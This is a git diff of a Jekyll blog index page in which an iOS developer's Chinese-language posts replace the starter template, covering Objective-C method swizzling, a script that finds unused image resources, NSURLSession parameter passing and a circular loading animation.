@@ -3,7 +3,7 @@
 <html lang="en">
   <head>
     <meta charset="utf-8">
-    <title>Hello World!</title>
+    <title>snorlax's Homepage</title>
     
     <meta name="author" content="Xinzheng Zhang">
 
@@ -48,7 +48,7 @@
     
       
       	
-      	<li><a href="/about.html">about me</a></li>
+      	<li><a href="/about.html">About me</a></li>
       	
       
     
@@ -56,8 +56,16 @@
     
       
       	
-      	<li><a href="/archive.html">archive</a></li>
+      	<li><a href="/archive.html">Archives</a></li>
       	
+      
+    
+  
+    
+      
+    
+  
+    
       
     
   
@@ -81,168 +89,2146 @@
         </div>
       </div>
     </div>
+    <div class="container_wrapper">
+      <div class="container-narrow">
+        <div class="content">
+          <!-- <ul class="listing"> -->
 
-    <div class="container-narrow">
-
-      <div class="content">
-        
 <div class="page-header">
-  <h1>Hello World!  <small>Supporting tagline</small></h1>
+  <h3><a href="/program/2014/03/06/tableview%E4%B8%8A%E6%BB%91%E5%8A%A8%E6%97%B6%E7%9A%84navigation%20bar%E7%9A%84%E9%81%AE%E7%BD%A9">tableview上滑动时的navigation bar的遮罩 </a></h3>
+  <div class="date">
+    <span>06 March 2014</span>
+  </div>
 </div>
 
-<div class="row-fluid">
+<div class="row-fluid post-full">
   <div class="span12">
-    <p>Read <a href="http://jekyllbootstrap.com/usage/jekyll-quick-start.html">Jekyll Quick Start</a></p>
+    <div class="content">
+      <p>这个需求本来并不复杂、烦人的几乎这端遮罩代码要复用到每个tablview所在的场景、非常的不合适、直到看到了前辈写的一段hack到暴的代码才深知道所在的差距……
+他大致的思路就是给scrollview拓展了一个category、利用ios的运行时的特性、在他load的时候直接把他的setContenOffset给替换掉成了自己的函数、用他来控制公共的navigationbar
+代码如下</p>
+<div class="highlight"><pre><code class="language-objective-c" data-lang="objective-c"><span class="k">@interface</span> <span class="nc">UIScrollView</span> <span class="nl">(ContentOffset)</span>
 
-<p>Complete usage and documentation available at: <a href="http://jekyllbootstrap.com">Jekyll Bootstrap</a></p>
+<span class="k">+</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">load</span><span class="p">;</span> <span class="c1">//复写掉load方法</span>
 
-<h2>Update Author Attributes</h2>
+<span class="k">@end</span>
 
-<p>In <code>_config.yml</code> remember to specify your own data:</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">title : My Blog =)
+<span class="k">@implementation</span> <span class="nc">UIScrollView</span> <span class="nl">(ContentOffset)</span>
 
-author :
-  name : Name Lastname
-  email : blah@email.test
-  github : username
-  twitter : username
+<span class="k">+</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">load</span>
+<span class="p">{</span>
+    <span class="n">method_exchangeImplementations</span><span class="p">(</span><span class="n">class_getInstanceMethod</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">setContentOffset</span><span class="o">:</span><span class="p">)),</span> <span class="n">class_getInstanceMethod</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="k">@selector</span><span class="p">(</span><span class="n">swizzled_setContentOffset</span><span class="o">:</span><span class="p">)));</span><span class="c1">//替换原生的与自己重写的</span>
+<span class="p">}</span>
+
+<span class="k">-</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">swizzled_setContentOffset:</span><span class="p">(</span><span class="n">CGPoint</span><span class="p">)</span><span class="nv">point</span>
+<span class="p">{</span>
+    <span class="p">[</span><span class="n">self</span> <span class="n">swizzled_setContentOffset</span><span class="o">:</span><span class="n">point</span><span class="p">];</span><span class="c1">//由于此时已经被交换了所以调用自己相当于是在调原生的setContOffset</span>
+
+    <span class="n">ZDDeckViewManager</span> <span class="o">*</span><span class="n">deck</span> <span class="o">=</span> <span class="p">[</span><span class="n">ZDDeckViewManager</span> <span class="n">sharedInstance_ks</span><span class="p">];</span><span class="c1">//单例拿到大家一起控制的navigationbar</span>
+    <span class="cm">/*这里就可以在滑动状态上对bar做任何事情了*/</span>
+<span class="p">}</span>
+
+<span class="k">@end</span>
 </code></pre></div>
-<p>The theme should reference these variables whenever needed.</p>
+    </div>
 
-<h2>Sample Posts</h2>
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
 
-<p>This blog contains sample posts which help stage pages and blog data.
-When you don&#39;t need the samples anymore just delete the <code>_posts/core-samples</code> folder.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">$ rm -rf _posts/core-samples
-</code></pre></div>
-<p>Here&#39;s a sample &quot;posts list&quot;.</p>
 
-<ul class="posts">
   
-    <li><span>26 May 2014</span> &raquo; <a href="/2014/05/26/test">test</a></li>
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
   
-    <li><span>03 Feb 2014</span> &raquo; <a href="/program/2014/02/03/%E6%9C%AA%E5%BC%95%E7%94%A8%E5%9B%BE%E7%89%87%E5%88%A0%E9%99%A4">未引用图片删除</a></li>
-  
-    <li><span>03 Feb 2014</span> &raquo; <a href="/program/2014/02/03/%E5%85%B3%E4%BA%8Ensurlsessiondownloadtask%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92">关于NSURLSessionDownloadTask的参数传递</a></li>
-  
-    <li><span>30 Jul 2013</span> &raquo; <a href="/program/2013/07/30/%E5%9C%86%E5%BD%A2%E5%B8%83%E5%B1%80%E7%9A%84icon%E9%A1%B5%E9%9D%A2-loading%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C">圆形布局的icon页面 loading动画效果</a></li>
-  
-    <li><span>29 Jul 2013</span> &raquo; <a href="/program/2013/07/29/ios%E6%9B%BF%E6%8D%A2%E7%B3%BB%E7%BB%9F%E6%96%B9%E6%B3%95">ios替换系统方法</a></li>
-  
-    <li><span>24 Jun 2013</span> &raquo; <a href="/program/2013/06/24/%E5%AE%9A%E5%88%B6-uipagecontrol">定制 UIPageControl</a></li>
-  
-    <li><span>08 May 2013</span> &raquo; <a href="/program/2013/05/08/%E6%9C%80%E5%A4%A7%E5%85%AC%E5%85%B1%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97lcs-python%E5%AE%9E%E7%8E%B0">最大公共上升子序列(lcs) python实现</a></li>
-  
-    <li><span>06 May 2013</span> &raquo; <a href="/program/2013/05/06/boyer-moore%E7%AE%97%E6%B3%95-python%E5%AE%9E%E7%8E%B0">Boyer-Moore算法 python实现</a></li>
-  
-    <li><span>05 May 2013</span> &raquo; <a href="/program/2013/05/05/%E8%B7%B3%E8%A1%A8python%E5%AE%9E%E7%8E%B0">跳表python实现</a></li>
-  
-    <li><span>26 Apr 2013</span> &raquo; <a href="/program/2013/04/26/%E5%85%B3%E4%BA%8Eprotocol-buffer-%E4%B8%AD%E7%9A%84base-128-varints%E7%BC%96%E7%A0%81">关于protocol buffer 中的Base 128 Varints编码</a></li>
-  
-    <li><span>09 Apr 2013</span> &raquo; <a href="/program/2013/04/09/list%E4%B8%AD%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%B8%89%E8%A7%92%E5%BD%A2%E4%B8%89%E8%BE%B9">list中判断是否存在三角形三边</a></li>
-  
-    <li><span>04 Apr 2013</span> &raquo; <a href="/program/2013/04/04/beauty-of-programming-%E7%BB%83%E4%B9%A0%E8%B5%9B%E7%AC%AC%E4%B8%89%E9%A2%98">beauty of programming 练习赛第三题</a></li>
-  
-    <li><span>29 Mar 2013</span> &raquo; <a href="/%E6%9C%AA%E5%88%86%E7%B1%BB/2013/03/29/%E7%9D%A1%E7%9C%A0%E6%8E%92%E5%BA%8Fshell%E5%AE%9E%E7%8E%B0">睡眠排序shell实现</a></li>
-  
-    <li><span>28 Mar 2013</span> &raquo; <a href="/program/2013/03/28/%E5%85%B3%E4%BA%8Egcc%E4%BC%98%E5%8C%96%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0-5">关于gcc优化拷贝构造</a></li>
-  
-    <li><span>26 Mar 2013</span> &raquo; <a href="/life/2013/03/26/%E6%B3%A8%E5%86%8C%E4%BA%86-ask-fm">注册了 ask.fm</a></li>
-  
-    <li><span>20 Mar 2013</span> &raquo; <a href="/program/2013/03/20/arp%E6%AC%BA%E9%AA%97%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E3%80%81arp%E5%8C%85%E8%A7%A3%E6%9E%90">arp欺骗中间人攻击的实现、arp包解析</a></li>
-  
-    <li><span>15 Mar 2013</span> &raquo; <a href="/program/2013/03/15/sae-%E6%99%AE%E9%80%9A%E5%BC%80%E5%8F%91%E8%80%85%E5%85%8D%E6%8E%A8%E8%8D%90%E8%AE%A4%E8%AF%81%E6%B4%BB%E5%8A%A83-15-%E8%A7%A3">sae 普通开发者免推荐认证活动3.15 解</a></li>
-  
-    <li><span>09 Mar 2013</span> &raquo; <a href="/program/2013/03/09/%E5%85%B3%E4%BA%8Ewordpress-%E5%90%8C%E6%AD%A5twitter%E5%8A%A0%E7%9F%AD%E5%9C%B0%E5%9D%80%E6%9C%8D%E5%8A%A1">关于wordpress 同步twitter加短地址服务</a></li>
-  
-    <li><span>07 Mar 2013</span> &raquo; <a href="/program/2013/03/07/%E5%85%B3%E4%BA%8Eios%E4%B8%8B%E7%9A%84goagent%E4%BD%BF%E7%94%A8">关于ios下的goagent使用</a></li>
-  
-    <li><span>29 Jan 2013</span> &raquo; <a href="/%E6%9C%AA%E5%88%86%E7%B1%BB/2013/01/29/%E5%85%B3%E4%BA%8Ewindows%E9%87%8C%E7%9A%84python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">关于windows里的python环境配置</a></li>
-  
-    <li><span>21 Jan 2013</span> &raquo; <a href="/%E6%9C%AA%E5%88%86%E7%B1%BB/2013/01/21/%E5%85%B3%E4%BA%8E%E5%A4%84%E7%90%86%E6%8E%89urllib2%E4%B8%AD%E7%9A%84%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA%E5%BC%82%E5%B8%B8">关于处理掉urllib2中的错误提示异常</a></li>
-  
-    <li><span>07 Jan 2013</span> &raquo; <a href="/program/2013/01/07/%E5%85%B3%E4%BA%8E%E5%B5%8C%E5%A5%97%E4%B8%8Euiscrollview%E4%B8%AD%E7%9A%84uitableview%E7%9A%84%E5%86%B2%E7%AA%81%E8%A7%A3%E5%86%B3">关于嵌套与UIScrollView中的UITableVIew的冲突解决</a></li>
-  
-    <li><span>01 Jan 2013</span> &raquo; <a href="/%E7%9E%8E%E5%86%99%E5%86%99/2013/01/01/rc4-python%E5%AE%9E%E7%8E%B0">rc4 python实现</a></li>
-  
-    <li><span>23 Dec 2012</span> &raquo; <a href="/program/2012/12/23/os-x-%E7%9A%84%E5%90%AF%E5%8A%A8%E9%A1%B9">os x 的启动项</a></li>
-  
-    <li><span>07 Dec 2012</span> &raquo; <a href="/program/2012/12/07/%E7%9B%B8%E4%BC%BC%E5%9B%BE%E7%89%87%E6%90%9C%E7%B4%A2python%E5%AE%9E%E7%8E%B0">相似图片搜索python实现</a></li>
-  
-    <li><span>07 Dec 2012</span> &raquo; <a href="/program/2012/12/07/%E5%85%B3%E4%BA%8Epython%E5%9B%BE%E5%BD%A2%E5%BA%93pil%E5%9C%A8mac-os%E4%B8%8B%E7%9A%84%E5%AE%89%E8%A3%85">关于python图形库pil在mac os下的安装</a></li>
-  
-    <li><span>04 Dec 2012</span> &raquo; <a href="/program/2012/12/04/ios-safari5-webview%E5%AF%B9-contenteditable-%E7%9A%84%E4%BF%AE%E6%AD%A3">ios safari5 webview对 contenteditable 的修正</a></li>
-  
-    <li><span>03 Dec 2012</span> &raquo; <a href="/program/2012/12/03/ios%E5%87%A0%E7%A7%8D%E5%9F%BA%E6%9C%AC%E8%A7%86%E5%9B%BE%E5%88%87%E6%8D%A2%E5%8A%A8%E7%94%BB%E5%B0%8F%E7%BB%93">ios几种基本视图切换动画小结</a></li>
-  
-    <li><span>28 Nov 2012</span> &raquo; <a href="/program/2012/11/28/bmp%E3%80%81png%E5%88%9D%E7%90%86%E8%A7%A3">bmp、png初理解</a></li>
-  
-    <li><span>24 Nov 2012</span> &raquo; <a href="/program/2012/11/24/regexkit%E7%AC%94%E8%AE%B0">RegexKit笔记</a></li>
-  
-    <li><span>16 Nov 2012</span> &raquo; <a href="/%E7%9E%8E%E5%86%99%E5%86%99/2012/11/16/%E8%A2%ABwindows%E8%89%B9%E4%BA%86%E4%B8%80%E5%A4%A9%E7%9A%84%E5%B0%8F%E6%84%9F">被windows艹了一天的小感</a></li>
-  
-    <li><span>14 Nov 2012</span> &raquo; <a href="/life/2012/11/14/%E4%B8%80%E4%BA%BA%E6%9A%AE%E3%82%89%E3%81%97">一人暮らし</a></li>
-  
-    <li><span>13 Nov 2012</span> &raquo; <a href="/program/2012/11/13/aria2c-%E8%BF%85%E9%9B%B7%E7%A6%BB%E7%BA%BF%E7%9A%84%E4%B8%8B%E8%BD%BD%E6%B3%95">aria2c 迅雷离线的下载法</a></li>
-  
-    <li><span>11 Nov 2012</span> &raquo; <a href="/program/2012/11/11/%E5%85%89%E6%A3%8D%E7%A8%8B%E5%BA%8F%E5%91%98%E9%97%AF%E5%85%B3%E6%94%BB%E7%95%A51_9%E6%90%AD%E6%A2%AF4_6_8">光棍程序员闯关攻略1_9(搭梯4_6_8)</a></li>
-  
-    <li><span>08 Nov 2012</span> &raquo; <a href="/program/2012/11/08/%E7%AC%AC%E4%B8%89%E8%8C%83%E5%BC%8Fbc%E8%8C%83%E5%BC%8F-2">第三范式&BC范式</a></li>
-  
-    <li><span>08 Nov 2012</span> &raquo; <a href="/program/2012/11/08/%E7%AC%AC%E4%B8%89%E8%8C%83%E5%BC%8Fbc%E8%8C%83%E5%BC%8F">第三范式&BC范式</a></li>
-  
-    <li><span>06 Nov 2012</span> &raquo; <a href="/%E7%9E%8E%E5%86%99%E5%86%99/2012/11/06/%E5%A4%8D%E4%B9%A0%E7%BD%91%E7%BB%9C%E6%97%B6%E7%9A%84%E4%B8%80%E4%B8%AA%E5%BE%88%E4%B8%8D%E6%88%90%E7%86%9F%E7%9A%84%E6%83%B3%E6%B3%95">复习网络时的一个很不成熟的想法</a></li>
-  
-    <li><span>04 Nov 2012</span> &raquo; <a href="/program/2012/11/04/%E5%85%B3%E4%BA%8E%E4%B8%9C%E5%A4%A7%E6%83%85%E6%8A%A5%E7%A0%94%E7%A9%B6%E7%94%9F%E6%B5%B7%E6%8A%A5%E7%9A%84%E5%BD%A9%E8%9B%8B">关于东大情报研究生海报的彩蛋</a></li>
-  
-    <li><span>02 Nov 2012</span> &raquo; <a href="/program/2012/11/02/os-x-safari%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE">os x safari代理配置</a></li>
-  
-    <li><span>22 Oct 2012</span> &raquo; <a href="/program/2012/10/22/%E5%88%86%E4%BA%ABhtml5%E6%96%B0%E7%89%B9%E6%80%A7-contenteditable">分享html5新特性 contenteditable</a></li>
-  
-    <li><span>16 Oct 2012</span> &raquo; <a href="/program/2012/10/16/%E4%B8%80%E4%B8%AA%E9%9D%9E%E5%B8%B8%E7%AE%80%E6%98%93%E7%9A%84%E9%9A%8F%E6%9C%BA%E9%80%89%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F">一个非常简易的随机选的小程序</a></li>
-  
-    <li><span>21 Aug 2012</span> &raquo; <a href="/program/2012/08/21/%E5%85%B3%E4%BA%8Eos%E7%9A%84%E4%B8%80%E7%82%B9%E5%B0%8F%E8%A7%81">关于os的一点小见</a></li>
-  
-    <li><span>22 Jul 2012</span> &raquo; <a href="/life/2012/07/22/%E9%94%A1%E7%AE%94">锡箔</a></li>
-  
-    <li><span>05 Jul 2012</span> &raquo; <a href="/program/2012/07/05/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E5%BE%88%E5%A5%BD%E7%94%A8%E7%9A%84python%E7%9A%84web%E6%A1%86%E6%9E%B6">分享一个很好用的python的web框架</a></li>
-  
-    <li><span>24 Apr 2012</span> &raquo; <a href="/program/2012/04/24/%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B7%B7%E4%B9%B1%E4%BB%A3%E7%A0%81">有趣的混乱代码</a></li>
-  
-    <li><span>31 Mar 2012</span> &raquo; <a href="/life/2012/03/31/38"></a></li>
-  
-    <li><span>18 Mar 2012</span> &raquo; <a href="/program/2012/03/18/%E5%BC%80%E6%BA%90%E5%BA%93asyncsocket%E5%AE%9E%E7%8E%B0socket%E9%80%9A%E4%BF%A1%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">开源库AsyncSocket实现socket通信的基本用法</a></li>
-  
-    <li><span>14 Mar 2012</span> &raquo; <a href="/program/2012/03/14/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAwebview%E5%92%8Cjs%E4%BA%A4%E4%BA%92%E7%9A%84%E5%B0%81%E8%A3%85">分享一个webview和js交互的封装</a></li>
-  
-    <li><span>13 Mar 2012</span> &raquo; <a href="/life/2012/03/13/%E8%90%BD%E8%84%9A%E7%82%B9">落脚点</a></li>
-  
-    <li><span>13 Mar 2012</span> &raquo; <a href="/program/2012/03/13/test-codebox">test CodeBox</a></li>
-  
-    <li><span>13 Mar 2012</span> &raquo; <a href="/%E7%9E%8E%E5%86%99%E5%86%99/2012/03/13/hello-wordpress">hello wordpress</a></li>
-  
-</ul>
 
-<h2>To-Do</h2>
 
-<p>This theme is still unfinished. If you&#39;d like to be added as a contributor, <a href="http://github.com/plusjade/jekyll-bootstrap">please fork</a>!
-We need to clean up the themes, make theme usage guides with theme-specific markup examples.</p>
 
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
   </div>
 </div>
 
 
-      </div>
-      <hr>
-      <footer>
-        <p>&copy; 2014 Xinzheng Zhang
-          with help from <a href="http://jekyllbootstrap.com" target="_blank" title="The Definitive Jekyll Blogging Framework">Jekyll Bootstrap</a>
-          and <a href="http://twitter.github.com/bootstrap/" target="_blank">Twitter Bootstrap</a>
-        </p>
-      </footer>
+<div class="page-header">
+  <h3><a href="/program/2014/03/05/%E6%9C%AA%E5%BC%95%E7%94%A8%E5%9B%BE%E7%89%87%E5%88%A0%E9%99%A4">未引用图片删除 </a></h3>
+  <div class="date">
+    <span>05 March 2014</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>同理可以用来处理些别的资源文件</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/sh</span>
+<span class="nv">PROJ</span><span class="o">=</span><span class="sb">`</span>find . -name <span class="s1">&#39;*.xib&#39;</span> -o -name <span class="s1">&#39;*.[mh]&#39;</span><span class="sb">`</span>
+
+<span class="k">for </span>png in <span class="sb">`</span>find . -name <span class="s1">&#39;*.png&#39;</span> <span class="p">|</span> grep -v @2x<span class="sb">`</span> <span class="c">#所要处理的资源文件类型</span>
+<span class="k">do</span>
+<span class="k">    </span><span class="nv">name</span><span class="o">=</span><span class="sb">`</span>basename <span class="nv">$png</span><span class="sb">`</span>
+    <span class="nv">name</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$name</span> <span class="p">|</span> sed -e <span class="s1">&#39;s/\.png//g&#39;</span><span class="sb">`</span>  <span class="c">#在代码中的表现形势、如果有一些拼串的需要特殊处理</span>
+    <span class="k">if</span> ! grep -qhs <span class="nv">$name</span> <span class="nv">$PROJ</span><span class="p">;</span> <span class="k">then</span>
+<span class="k">        </span><span class="nv">tmp</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$png</span> <span class="p">|</span> grep /Zhidao/Resources/Image <span class="p">|</span> grep -v /Image/Professional/<span class="sb">`</span> <span class="c">#排除一些不想处理的文件架比如引用外部封完的东西的</span>
+        <span class="k">if</span> <span class="o">[</span> <span class="s2">&quot;$tmp&quot;</span> <span class="o">=</span> <span class="s2">&quot;$png&quot;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+<span class="k">            </span><span class="nb">echo</span> <span class="s2">&quot;$png is not referenced&quot;</span>
+<span class="c">#           svn rm $png</span>
+<span class="c">#           doubleName=`echo $png | sed -e &#39;s/\.png/@2x\.png/g&#39;`</span>
+<span class="c">#           svn rm $doubleName@</span>
+
+        <span class="k">fi</span>
+<span class="k">    fi</span>
+<span class="k">done</span>
+</code></pre></div>
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2014/02/03/%E5%85%B3%E4%BA%8Ensurlsessiondownloadtask%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92">关于NSURLSessionDownloadTask的参数传递 </a></h3>
+  <div class="date">
+    <span>03 February 2014</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p>ios7开放了一组新的api其中一个最吸引人的也应该就是开放了后台下载的接口。当然凭ios一贯的作风肯定是把接口封的简单的要死然后用着噁心的要死……反正我是绝对被噁心到了、最近要解决的一个问题就是把downloadtask和实体关联上的问题。当然最简单的就是传参数了，然后我可以很负责的告诉你……尼玛你assign task的时候和从call back拿的时候不是一个实体！！！wtf……所以什么用runtime给他加点奇怪的东西什么都别想了……<br />
+-------------------------------------------万恶的分割线-----------------------------------------------<br />
+然后就说下解决办法吧……其实想想是会吐血的，仔细看看他的.h里面终于发现了还有这个一个东西……至少他是不会变的……<br />
+所以我们既然找到了有不变的东西那么就终于可以有解决办法了……直接把要传的东西转成json靠这个东西传简直轻松又愉快……</p>
+<div class="highlight"><pre><code class="language-objective-c" data-lang="objective-c"><span class="cm">/*</span>
+<span class="cm"> * The taskDescription property is available for the developer to</span>
+<span class="cm"> * provide a descriptive label for the task.</span>
+<span class="cm"> */</span>
+<span class="k">@property</span> <span class="p">(</span><span class="n">copy</span><span class="p">)</span> <span class="n">NSString</span> <span class="o">*</span><span class="n">taskDescription</span><span class="p">;</span>
+</code></pre></div>
+    </div>
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-folder-open"></i></li>
+      
+      
+
+
+  
+    
+    	<li><a href="#program-ref">
+    		program <span>39</span>
+    	</a></li>
+    
+  
+
+
+
+    </ul>
+  
+
+  
+    <ul class="tag_box inline">
+      <li><i class="icon-tags"></i></li>
+      
+      
+
+
+  
+    
+  
+
+
+
+    </ul>
+  
+  </div>
+</div>
+
+
+<div class="page-header">
+  <h3><a href="/program/2013/07/30/%E5%9C%86%E5%BD%A2%E5%B8%83%E5%B1%80%E7%9A%84icon%E9%A1%B5%E9%9D%A2-loading%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C">圆形布局的icon页面 loading动画效果 </a></h3>
+  <div class="date">
+    <span>30 July 2013</span>
+  </div>
+</div>
+
+<div class="row-fluid post-full">
+  <div class="span12">
+    <div class="content">
+      <p><a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/07/700BAD52-7C3F-4500-8B52-69C13291528D.jpg"><img src="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/07/700BAD52-7C3F-4500-8B52-69C13291528D.jpg" alt="" title="700BAD52-7C3F-4500-8B52-69C13291528D" width="314" height="470" class="alignnone size-full wp-image-397" /></a>
+大致效果就是3个元素根据不同时间间隔开始沿着圆进行无限追逐，每次一圈后进行一个小停顿然后继续、比较类似wp7的那种小的loading、主要用到的还是CAKeyframeAnimation其中为了让无限循环中加上停顿用了个小trick
+</p>
+<div class="highlight"><pre><code class="language-objective-c" data-lang="objective-c"><span class="cp">#import &lt;QuartzCore/QuartzCore.h&gt;</span>
+<span class="cp">#define PI 3.14159265358979323846</span>
+<span class="k">@interface</span> <span class="nc">canvas</span> <span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">UIButton</span> <span class="o">*</span><span class="n">red</span><span class="p">;</span>
+    <span class="n">UIButton</span> <span class="o">*</span><span class="n">green</span><span class="p">;</span>
+    <span class="n">UIButton</span> <span class="o">*</span><span class="n">yellow</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">@end</span>
+
+<span class="k">@implementation</span> <span class="nc">canvas</span>
+
+<span class="k">-</span> <span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nf">initWithFrame:</span><span class="p">(</span><span class="n">CGRect</span><span class="p">)</span><span class="nv">frame</span>
+<span class="p">{</span>
+    <span class="n">self</span> <span class="o">=</span> <span class="p">[</span><span class="n">super</span> <span class="n">initWithFrame</span><span class="o">:</span><span class="n">frame</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">self</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// Initialization code</span>
+        <span class="n">red</span><span class="o">=</span><span class="p">[[</span><span class="n">UIButton</span> <span class="n">alloc</span><span class="p">]</span><span class="n">initWithFrame</span><span class="o">:</span><span class="n">CGRectMake</span><span class="p">(</span><span class="mf">117.55</span><span class="o">-</span><span class="mi">10</span><span class="p">,</span> <span class="mf">38.1</span><span class="o">-</span><span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">)];</span>
+        <span class="n">green</span><span class="o">=</span><span class="p">[[</span><span class="n">UIButton</span> <span class="n">alloc</span><span class="p">]</span><span class="n">initWithFrame</span><span class="o">:</span><span class="n">CGRectMake</span><span class="p">(</span><span class="mf">141.42</span><span class="o">-</span><span class="mi">10</span><span class="p">,</span> <span class="mf">58.57</span><span class="o">-</span><span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">)];</span>
+        <span class="n">yellow</span><span class="o">=</span><span class="p">[[</span><span class="n">UIButton</span> <span class="n">alloc</span><span class="p">]</span><span class="n">initWithFrame</span><span class="o">:</span><span class="n">CGRectMake</span><span class="p">(</span><span class="mf">173.2</span><span class="o">-</span><span class="mi">10</span><span class="p">,</span> <span class="mi">100</span><span class="o">-</span><span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">10</span><span class="p">)];</span>
+        <span class="p">[</span><span class="n">red</span> <span class="n">setBackgroundColor</span><span class="o">:</span><span class="p">[</span><span class="n">UIColor</span> <span class="n">redColor</span><span class="p">]];</span>
+        <span class="p">[</span><span class="n">green</span> <span class="n">setBackgroundColor</span><span class="o">:</span><span class="p">[</span><span class="n">UIColor</span> <span class="n">greenColor</span><span class="p">]];</span>
+        <span class="p">[</span><span class="n">yellow</span> <span class="n">setBackgroundColor</span><span class="o">:</span><span class="p">[</span><span class="n">UIColor</span> <span class="n">yellowColor</span><span class="p">]];</span>
+        <span class="p">[</span><span class="n">red</span> <span class="n">addTarget</span><span class="o">:</span><span class="n">self</span> <span class="n">action</span><span class="o">:</span><span class="k">@selector</span><span class="p">(</span><span class="n">end</span><span class="p">)</span> <span class="n">forControlEvents</span><span class="o">:</span><span class="n">UIControlEventTouchUpInside</span><span class="p">];</span>
+        <span class="p">[</span><span class="n">yellow</span> <span class="n">addTarget</span><span class="o">:</span><span class="n">self</span> <span class="n">action</span><span class="o">:</span><span class="k">@selector</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="n">forControlEvents</span><span class="o">:</span><span class="n">UIControlEventTouchUpInside</span><span class="p">];</span>
+
+        <span class="p">[</span><span class="n">self</span> <span class="n">start</span><span class="p">];</span>
+        <span class="p">[</span><span class="n">self</span> <span class="n">addSubview</span><span class="o">:</span><span class="n">red</span><span class="p">];</span>
+        <span class="p">[</span><span class="n">self</span> <span class="n">addSubview</span><span class="o">:</span><span class="n">green</span><span class="p">];</span>
+        <span class="p">[</span><span class="n">self</span> <span class="n">addSubview</span><span class="o">:</span><span class="n">yellow</span><span class="p">];</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">self</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">-</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">end</span><span class="p">{</span>
+    <span class="p">[</span><span class="n">red</span><span class="p">.</span><span class="n">layer</span> <span class="n">removeAllAnimations</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">green</span><span class="p">.</span><span class="n">layer</span> <span class="n">removeAllAnimations</span><span class="p">];</span>
+    <span class="p">[</span><span class="n">yellow</span><span class="p">.</span><span class="n">layer</span> <span class="n">removeAllAnimations</span><span class="p">];</span>
+<span class="p">}</span>
+<span class="k">-</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">start</span><span class="p">{</span>
+    <span class="n">CGMutablePathRef</span> <span class="n">path</span><span class="o">=</span><span class="n">CGPathCreateMutable</span><span class="p">();</span>
+    <span class="n">CGPathAddArc</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mf">0.0f</span><span class="p">,</span> <span class="mf">200.0f</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.8424</span><span class="p">,</span> <span class="o">-</span><span class="mf">0.8424</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="n">PI</span><span class="p">,</span> <span class="nb">NO</span><span class="p">);</span><span class="c1">//用cgpath画出运动轨迹</span>
